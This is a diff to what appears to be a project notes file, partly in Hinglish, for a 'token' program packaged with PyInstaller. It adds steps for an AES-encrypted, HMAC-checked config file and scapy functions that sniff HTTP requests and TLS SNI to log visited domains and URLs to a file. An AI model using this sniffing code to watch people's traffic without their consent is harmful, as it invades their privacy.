@@ -2,3 +2,53 @@ ye token ka code hai, isko pyinstller se exe file banana hai end mai
 
 
 iske dist folder mai exe file hai
+
+
+steps for generating config file - server
+first take data
+choose IV and Key string
+generate AES keys from IV and Key strings
+
+generate hash hmac for (iv string + data string) using key string 
+
+add hash to config
+encrypt the data using AES
+add encrypted data to config
+add IV string to config
+
+
+steps for validating config file -- token
+take the IV, enc data, hmac from config.json file
+
+key already exists with the token
+
+convert key and iv to AES keys
+decrypt data using AES
+
+generate hash hmac for (iv string + decrypted data string) using key string
+compare new hmac to already present hmac
+
+
+def http_sniffer(pkt):
+    if pkt.haslayer(HTTPRequest):
+        host = pkt[HTTPRequest].Host.decode() if pkt[HTTPRequest].Host else "Unknown"
+        path = pkt[HTTPRequest].Path.decode() if pkt[HTTPRequest].Path else "/"
+        print(f"[HTTP] Visited: http://{host}{path}")
+        writeToFile('domain', f"{host}{path}")
+
+def https_sniffer(pkt):
+    if pkt.haslayer(TLSClientHello):
+        for ext in pkt[TLSClientHello].ext:
+            if isinstance(ext, TLS_Ext_ServerName):
+                try:
+                    domain = ext.servernames[0].servername.decode()
+                    print(f"[HTTPS] Visited domain: {domain}")
+                    writeToFile('domain',domain)
+                except:
+                    pass
+
+def combined_sniffer(pkt):
+    if pkt.haslayer(HTTPRequest):
+        http_sniffer(pkt)
+    elif pkt.haslayer(TLSClientHello):
+        https_sniffer(pkt)
